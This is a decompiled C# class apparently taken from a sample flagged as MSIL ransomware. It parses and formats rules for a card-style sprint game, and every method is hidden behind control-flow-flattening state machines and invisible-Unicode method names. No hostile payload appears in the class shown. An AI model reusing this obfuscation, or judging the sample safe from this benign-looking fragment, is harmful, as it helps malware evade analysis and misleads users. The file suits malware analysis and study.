// Decompiled with JetBrains decompiler
// Type: Cytotechnologist.Rules
// Assembly: AppConte, Version=2.0.4.0, Culture=neutral, PublicKeyToken=null
// MVID: 7B8B5733-911E-457B-A55E-DDA2927F5FA5
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.02-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-60ba049b8af0c51a8dfbc45cacedef4180000b7739c937d22d8cbd66d4c6a8a8.exe

using SimpleJSON;
using System;
using System.Collections.Generic;
using System.Globalization;
using System.Runtime.InteropServices;

namespace Cytotechnologist
{
  public class Rules
  {
    public int SprintCount { get; private set; }

    public int MaxImpact { get; private set; }

    public Card[] Cards { get; private set; }

    public int InitialResources { get; private set; }

    public int NormalPlanningCount { get; private set; }

    public int NormalPlanningCost { get; private set; }

    public int OverPlanningCost { get; private set; }

    public int SprintsWonWithoutPlanning { get; private set; }

    public float[] RiskChances { get; private set; }

    public bool EconomicsAffectsAll { get; private set; }

    public int StayOnSprintMinDiff { get; private set; }

    public bool OnlyOneWinner { get; private set; }

    private Rules()
    {
label_1:
      int num1 = -1344618477;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -1795378581)) % 3U)
        {
          case 0:
            goto label_3;
          case 1:
            num1 = (int) num2 * 1572813138 ^ 169037990;
            continue;
          case 2:
            goto label_1;
          default:
            goto label_5;
        }
      }
label_3:
      return;
label_5:;
    }

    public static Rules Deserialize(JSONNode json)
    {
label_1:
      int num1 = 886303683;
      int asInt;
      Rules rules;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 1311305576)) % 4U)
        {
          case 0:
            rules = new Rules()
            {
              SprintCount = json["sprints"].AsInt,
              MaxImpact = asInt,
              Cards = Rules.ParseDeck(json["deck"], asInt),
              InitialResources = json["initial-resources"].AsInt,
              NormalPlanningCount = json["normal-planning-count"].AsInt,
              NormalPlanningCost = json["normal-planning-cost"].AsInt,
              OverPlanningCost = json["over-planning-cost"].AsInt,
              SprintsWonWithoutPlanning = json["sprints-won-without-planning"].AsInt,
              RiskChances = Rules.ParseRiskChances(json["risk-chances"]),
              EconomicsAffectsAll = json["economics-affects-all"].AsBool,
              StayOnSprintMinDiff = json["stay-on-sprint-min-diff"].AsInt,
              OnlyOneWinner = json["only-one-winner"].AsBool
            };
            num1 = (int) num2 * -1745149690 ^ -436271143;
            continue;
          case 2:
            goto label_1;
          case 3:
            asInt = json["max-impact"].AsInt;
            num1 = (int) num2 * 1133215625 ^ -535762813;
            continue;
          default:
            goto label_5;
        }
      }
label_5:
      return rules;
    }

    private static float[] ParseRiskChances(JSONNode json)
    {
label_1:
      int num1 = 1621406674;
      int aIndex;
      float[] numArray;
      float[] riskChances;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 2081955443)) % 8U)
        {
          case 0:
            int num3;
            num1 = num3 = aIndex >= numArray.Length ? 2090390430 : (num3 = 14694336);
            continue;
          case 1:
            numArray = new float[json.Count];
            aIndex = 0;
            num1 = (int) num2 * -1621907228 ^ -1699890253;
            continue;
          case 2:
            ++aIndex;
            num1 = (int) num2 * 1172230195 ^ -434163099;
            continue;
          case 3:
            numArray[aIndex] = json[aIndex].AsFloat;
            num1 = 1671351417;
            continue;
          case 4:
            num1 = (int) num2 * -85350605 ^ -1359068361;
            continue;
          case 5:
            riskChances = numArray;
            num1 = (int) num2 * 1402221887 ^ -1026710969;
            continue;
          case 6:
            goto label_1;
          default:
            goto label_9;
        }
      }
label_9:
      return riskChances;
    }

    private static Card[] ParseDeck(JSONNode json, int maxImpact)
    {
label_1:
      int num1 = -1367007632;
      int aIndex1;
      int num2;
      JSONNode jsonNode;
      bool flag1;
      int aIndex2;
      bool flag2;
      List<Card> cardList;
      bool flag3;
      bool flag4;
      int count;
      Card[] array;
      while (true)
      {
        uint num3;
        switch ((num3 = (uint) (num1 ^ -1270911428)) % 27U)
        {
          case 0:
            jsonNode = json[aIndex2];
            aIndex1 = 0;
            num1 = -998817647;
            continue;
          case 1:
            int num4 = flag2 ? -1682087118 : (num4 = -714027494);
            num1 = num4 ^ (int) num3 * 71168284;
            continue;
          case 2:
            ++aIndex1;
            num1 = (int) num3 * 1289700223 ^ -899247857;
            continue;
          case 3:
            num1 = -1759667461;
            continue;
          case 4:
            flag3 = aIndex1 < maxImpact;
            num1 = (int) num3 * 1949528295 ^ 1602537958;
            continue;
          case 5:
            goto label_1;
          case 6:
            aIndex2 = 0;
            num1 = (int) num3 * -1430134322 ^ 791799905;
            continue;
          case 7:
            num1 = (int) num3 * -2065561362 ^ 1058913583;
            continue;
          case 8:
            num1 = -1494912777;
            continue;
          case 9:
            array = cardList.ToArray();
            num1 = (int) num3 * 1943200359 ^ -1458631906;
            continue;
          case 10:
            int num5 = flag1 ? -67766444 : (num5 = -1898700232);
            num1 = num5 ^ (int) num3 * -538644801;
            continue;
          case 11:
            cardList.Add(new Card()
            {
              Impact = flag3 ? -(maxImpact - aIndex1) : maxImpact * 2 - aIndex1,
              Type = aIndex2
            });
            num1 = -697377015;
            continue;
          case 13:
            num1 = (int) num3 * 492272112 ^ -616395361;
            continue;
          case 14:
            flag2 = aIndex2 < count;
            num1 = -1674183410;
            continue;
          case 15:
            num1 = (int) num3 * 634066773 ^ 1076978089;
            continue;
          case 16:
            count = json.Count;
            num1 = (int) num3 * -1767997462 ^ 347302981;
            continue;
          case 17:
            num2 = 0;
            num1 = (int) num3 * -1166744772 ^ 53034816;
            continue;
          case 18:
            num1 = (int) num3 * -1475177263 ^ 1628973003;
            continue;
          case 19:
            num1 = (int) num3 * -122180637 ^ 114972581;
            continue;
          case 20:
            cardList = new List<Card>();
            num1 = (int) num3 * 27506057 ^ 1448000042;
            continue;
          case 21:
            num1 = (int) num3 * 1472235799 ^ -113221539;
            continue;
          case 22:
            ++num2;
            num1 = (int) num3 * 530099836 ^ 1885637496;
            continue;
          case 23:
            ++aIndex2;
            num1 = (int) num3 * -245341135 ^ -1025653731;
            continue;
          case 24:
            flag4 = aIndex1 < maxImpact * 2;
            num1 = -2115921770;
            continue;
          case 25:
            int num6 = !flag4 ? -1025402014 : (num6 = -1933764343);
            num1 = num6 ^ (int) num3 * 1714832638;
            continue;
          case 26:
            flag1 = num2 < jsonNode[aIndex1].AsInt;
            num1 = -319152843;
            continue;
          default:
            goto label_28;
        }
      }
label_28:
      return array;
    }

    public override string ToString()
    {
label_1:
      int num1 = -696392522;
      string str;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -366163909)) % 4U)
        {
          case 0:
            num1 = (int) num2 * 1377875500 ^ -688831787;
            continue;
          case 1:
            str = Rules.\u206B‎⁮⁪‫‭⁪‏⁮⁮‍⁬‍‪​⁯⁭⁭⁯‮⁬⁭⁫‫⁯‌⁮‎⁯⁭‮‏‭⁫⁮⁪‪‮⁭⁯‮("sprints: {0},\nmax-impact:{1},\ndeck: \n{2},\n\ninitial-resources: {3},\n\nnormal-planning-count: {4},\nnormal-planning-cost: {5},\nover-planning-cost: {6},\nsprints-won-without-planning: {7},\n\nrisk-chances: {8},\n\neconomics-affects-all: {9},\nstay-on-sprint-min-diff: {10},\nonly-one-winner: {11}", new object[12]
            {
              (object) this.SprintCount,
              (object) this.MaxImpact,
              (object) this.CardsToString(),
              (object) this.InitialResources,
              (object) this.NormalPlanningCount,
              (object) this.NormalPlanningCost,
              (object) this.OverPlanningCost,
              (object) this.SprintsWonWithoutPlanning,
              (object) this.RiskChancesToString(),
              (object) this.EconomicsAffectsAll,
              (object) this.StayOnSprintMinDiff,
              (object) this.OnlyOneWinner
            });
            num1 = (int) num2 * -174837089 ^ -196462832;
            continue;
          case 3:
            goto label_1;
          default:
            goto label_5;
        }
      }
label_5:
      return str;
    }

    private string CardsToString()
    {
      string str1 = "[\n\t";
label_1:
      int num1 = -985580817;
      bool flag;
      Card card1;
      int num2;
      int index;
      string str2;
      Card[] cards;
      while (true)
      {
        uint num3;
        switch ((num3 = (uint) (num1 ^ -2084466605)) % 15U)
        {
          case 0:
            cards = this.Cards;
            index = 0;
            num1 = (int) num3 * -1992941774 ^ -1687038374;
            continue;
          case 1:
            num2 = 0;
            num1 = (int) num3 * -1042749221 ^ 1619215516;
            continue;
          case 2:
            int num4;
            num1 = num4 = index >= cards.Length ? -1544952032 : (num4 = -537352738);
            continue;
          case 3:
            num1 = (int) num3 * -1873915759 ^ -454008771;
            continue;
          case 4:
            goto label_1;
          case 6:
            str2 = Rules.\u200E⁯⁫⁭⁭‭‎‫⁬‍‮‏‌‏⁪‭⁪‪⁬‌‏​⁬‪​‮‪‏⁭​‍⁯⁮‫⁭‎‫⁭‮‬‮(str1, "\n]");
            num1 = (int) num3 * -37006939 ^ 326073164;
            continue;
          case 7:
            num1 = (int) num3 * -728878353 ^ 291921399;
            continue;
          case 8:
            ++index;
            num1 = (int) num3 * 2127372089 ^ 1722122024;
            continue;
          case 9:
            str1 = Rules.\u200E⁯⁫⁭⁭‭‎‫⁬‍‮‏‌‏⁪‭⁪‪⁬‌‏​⁬‪​‮‪‏⁭​‍⁯⁮‫⁭‎‫⁭‮‬‮(str1, "\n\t");
            num2 = card1.Type;
            num1 = (int) num3 * 1559207652 ^ 1648128739;
            continue;
          case 10:
            int num5 = flag ? 182163961 : (num5 = 11144395);
            num1 = num5 ^ (int) num3 * -1326815328;
            continue;
          case 11:
            flag = num2 != card1.Type;
            num1 = (int) num3 * -983999660 ^ -3908567;
            continue;
          case 12:
            string str3 = str1;
            Card card2 = card1;
            string str4 = card2 != null ? Rules.\u206C⁬‌⁯​‪‪​‌‬‪⁯‮‌‪​⁭​⁬‪⁭⁬​⁬‫‫⁯⁯⁮⁫‍‬‭‮‬‪‏⁮‬‌‮((object) card2) : (string) null;
            str1 = Rules.\u206B⁫‏⁮‮⁭‎‌‭⁪⁯⁬‪‪‮‫⁮⁭⁮‬‏⁫‏‭‌‭⁮‏⁬‪‎‪‎‭‫⁬‮‬‮‎‮(str3, str4, " ");
            num1 = -1162021437;
            continue;
          case 13:
            card1 = cards[index];
            num1 = -1220313115;
            continue;
          case 14:
            num1 = (int) num3 * -1956209937 ^ -293087932;
            continue;
          default:
            goto label_16;
        }
      }
label_16:
      return str2;
    }

    private string RiskChancesToString()
    {
      string str1 = Rules.\u200E⁯⁫⁭⁭‭‎‫⁬‍‮‏‌‏⁪‭⁪‪⁬‌‏​⁬‪​‮‪‏⁭​‍⁯⁮‫⁭‎‫⁭‮‬‮("[ ", this.RiskChances[0].ToString((IFormatProvider) Rules.\u202C⁫‮‪‫⁮​⁮‬⁭‏⁬‬‬‏‪‫⁬⁭​‌‫​⁭⁭⁮‌‪‏‍⁮⁭⁬‮‬​⁬‍⁯⁬‮()));
      int index = 1;
label_1:
      int num1 = 1641013376;
      string str2;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 1192079884)) % 8U)
        {
          case 0:
            str2 = Rules.\u200E⁯⁫⁭⁭‭‎‫⁬‍‮‏‌‏⁪‭⁪‪⁬‌‏​⁬‪​‮‪‏⁭​‍⁯⁮‫⁭‎‫⁭‮‬‮(str1, " ]");
            num1 = (int) num2 * -1901308407 ^ -460551562;
            continue;
          case 2:
            num1 = (int) num2 * -2115591175 ^ 1157421447;
            continue;
          case 3:
            str1 = Rules.\u206B⁫‏⁮‮⁭‎‌‭⁪⁯⁬‪‪‮‫⁮⁭⁮‬‏⁫‏‭‌‭⁮‏⁬‪‎‪‎‭‫⁬‮‬‮‎‮(str1, ", ", this.RiskChances[index].ToString((IFormatProvider) Rules.\u202C⁫‮‪‫⁮​⁮‬⁭‏⁬‬‬‏‪‫⁬⁭​‌‫​⁭⁭⁮‌‪‏‍⁮⁭⁬‮‬​⁬‍⁯⁬‮()));
            num1 = 50597219;
            continue;
          case 4:
            num1 = (int) num2 * 83511571 ^ 1457942502;
            continue;
          case 5:
            goto label_1;
          case 6:
            int num3;
            num1 = num3 = index < this.RiskChances.Length ? 1021114967 : (num3 = 875323404);
            continue;
          case 7:
            ++index;
            num1 = (int) num2 * -1022849610 ^ 94263400;
            continue;
          default:
            goto label_9;
        }
      }
label_9:
      return str2;
    }

    static string \u206B‎⁮⁪‫‭⁪‏⁮⁮‍⁬‍‪​⁯⁭⁭⁯‮⁬⁭⁫‫⁯‌⁮‎⁯⁭‮‏‭⁫⁮⁪‪‮⁭⁯‮([In] string obj0, [In] object[] obj1) => string.Format(obj0, obj1);

    static string \u200E⁯⁫⁭⁭‭‎‫⁬‍‮‏‌‏⁪‭⁪‪⁬‌‏​⁬‪​‮‪‏⁭​‍⁯⁮‫⁭‎‫⁭‮‬‮([In] string obj0, [In] string obj1) => obj0 + obj1;

    static string \u206C⁬‌⁯​‪‪​‌‬‪⁯‮‌‪​⁭​⁬‪⁭⁬​⁬‫‫⁯⁯⁮⁫‍‬‭‮‬‪‏⁮‬‌‮([In] object obj0) => obj0.ToString();

    static string \u206B⁫‏⁮‮⁭‎‌‭⁪⁯⁬‪‪‮‫⁮⁭⁮‬‏⁫‏‭‌‭⁮‏⁬‪‎‪‎‭‫⁬‮‬‮‎‮(
      [In] string obj0,
      [In] string obj1,
      [In] string obj2)
    {
      return obj0 + obj1 + obj2;
    }

    static CultureInfo \u202C⁫‮‪‫⁮​⁮‬⁭‏⁬‬‬‏‪‫⁬⁭​‌‫​⁭⁭⁮‌‪‏‍⁮⁭⁬‮‬​⁬‍⁯⁬‮() => CultureInfo.InvariantCulture;
  }
}
